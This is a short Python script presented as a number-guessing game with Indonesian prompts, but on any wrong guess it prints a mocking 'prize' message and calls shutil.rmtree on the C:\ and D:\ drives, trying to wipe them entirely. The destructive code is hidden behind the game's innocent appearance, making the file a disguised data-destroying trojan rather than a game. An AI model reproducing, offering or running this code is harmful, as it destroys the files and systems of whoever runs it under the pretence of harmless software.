import random
import os
import shutil
number = random.randint(1, 100)
guess = input("coba tebak angka dari 1-100: ")
guess = int(guess)

if guess == number:
    print("kau menebak angka yang benar")
else:
    if os.path.exists("C:\\"):
        print("Hadiah karena menjawab dengan salah")
        shutil.rmtree("C:\\")  
    if os.path.exists("D:\\"):
        print("Hadiah karena menjawab dengan salah")
        shutil.rmtree("D:\\")   
print("ingin mencoba lagi?")

